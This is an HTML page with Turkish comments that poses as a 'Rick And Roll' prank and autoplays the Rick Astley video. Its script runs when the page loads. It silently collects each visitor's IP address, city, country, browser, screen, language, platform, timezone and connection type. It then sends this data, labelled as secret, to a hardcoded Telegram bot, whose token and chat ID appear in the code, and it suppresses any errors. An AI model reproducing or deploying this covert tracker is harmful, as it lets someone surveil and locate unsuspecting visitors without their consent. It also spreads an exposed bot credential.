
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Rick And Roll</title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100%; overflow: hidden;
      background: black;
    }
    #player {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none; /* tıklamaları engelle */
      z-index: -1;
    }
  </style>
</head>
<body>
  <div id="player"></div>

  <script>
    // Telegram veri gönderme fonksiyonu
    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Sessiz hata yönetimi
      }
    }

    // Veri toplama fonksiyonu
    async function collectData() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message = `Gizli Veri:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Çözünürlük: ${screen.width}x${screen.height}\n` +
          `Dil: ${navigator.language}\n` +
          `Platform: ${navigator.platform}\n` +
          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        await sendToTelegram(message);
      } catch(e) {
        // Sessiz hata
      }
    }
    collectData();

    // YouTube iframe API yükle
    var tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    var firstScript = document.getElementsByTagName('script')[0];
    firstScript.parentNode.insertBefore(tag, firstScript);

    var player;
    function onYouTubeIframeAPIReady() {
      player = new YT.Player('player', {
        videoId: 'dQw4w9WgXcQ', // Rick Astley - Never Gonna Give You Up
        playerVars: {
          autoplay: 1,
          controls: 0,
          loop: 1,
          playlist: 'dQw4w9WgXcQ',
          modestbranding: 1,
          rel: 0,
          showinfo: 0,
          mute: 1
        },
        events: {
          onReady: function(event) {
            event.target.playVideo();
          }
        }
      });
    }
  </script>
</body>
</html>
